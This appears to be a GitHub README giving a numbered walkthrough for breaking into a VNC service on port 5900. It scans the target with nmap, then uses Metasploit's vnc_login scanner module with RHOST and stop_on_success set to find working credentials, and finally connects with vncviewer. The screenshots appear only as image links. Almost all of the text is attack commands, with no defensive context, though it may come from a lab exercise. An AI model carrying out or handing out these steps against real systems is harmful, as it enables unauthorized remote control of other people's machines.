# Port-5900-VNC-protocol-3.3-
1.nmap - sV (target ip)

![image](https://github.com/thanawut2903/Port-5900-VNC-protocol-3.3-/assets/159118913/bb6eefc3-6580-4779-99ed-19ff4dcc0171)


2.msfconsole

3.msf 6 > search vnc 3.3

4.msf 6 > use auxiliary/scanner/vnc/vnc_login

5.msf 6 > show options

![image](https://github.com/thanawut2903/Port-5900-VNC-protocol-3.3-/assets/159118913/537ce011-4904-46eb-8855-95636081c6a1)

6.msf 6 > set RHOST (trarget ip)

7.msf 6 > set stop_on_success true

8.msf 6 > exploit

![image](https://github.com/thanawut2903/Port-5900-VNC-protocol-3.3-/assets/159118913/e494720c-322e-4726-a146-97d1868a36e0)

9.vncviewer (target ip)

![image](https://github.com/thanawut2903/Port-5900-VNC-protocol-3.3-/assets/159118913/492a11d5-86e9-4b65-b2d9-864320804b38)

![image](https://github.com/thanawut2903/Port-5900-VNC-protocol-3.3-/assets/159118913/e1997fdd-e675-42de-8ae2-0249daa3e26f)



Reference form : https://www.youtube.com/watch?v=LCIKDuaYeIY
